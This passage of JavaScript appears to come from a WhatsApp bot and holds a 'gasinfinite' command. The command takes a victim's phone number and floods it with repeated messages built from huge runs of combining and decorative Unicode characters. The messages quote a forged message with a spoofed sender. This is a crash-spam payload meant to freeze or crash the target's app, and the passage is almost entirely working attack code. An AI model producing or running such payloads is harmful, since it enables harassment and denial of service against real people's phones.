𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
                   case 'gasinfinite':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
